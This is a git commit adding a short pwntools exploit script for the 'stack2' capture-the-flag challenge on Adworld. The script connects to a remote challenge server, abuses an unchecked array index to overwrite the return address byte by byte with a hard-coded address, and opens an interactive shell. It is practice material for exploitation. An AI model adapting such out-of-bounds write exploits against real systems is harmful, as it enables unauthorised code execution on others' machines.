6b85598a7e63b0f83abcefd1bddca4c099086bfe
doom-man <2840072208@qq.com>
2019-10-12 10:54:43 -0700

    doom

---
+++ adworld/stack2/exp.py
@@ -0,0 +1,24 @@
+from pwn import *
+#p = process('./stack2')
+p = remote("111.198.29.45","46344")
+#gdb.attach(p,"b *0x0804868D")
+write_addr = 0xffffd05c
+target_addr = [0x9b,0x85,0x04,0x08]
+
+p.recv()
+p.sendline("1")
+p.recv()
+p.sendline("1")
+p.recv()
+for i in range(4):
+	p.sendline("3")
+	p.recv()
+	p.sendline(str(0x84+i))
+	p.recv()
+	p.sendline(str(target_addr[i]))
+
+
+
+p.recv()
+p.sendline("5")
+p.interactive()
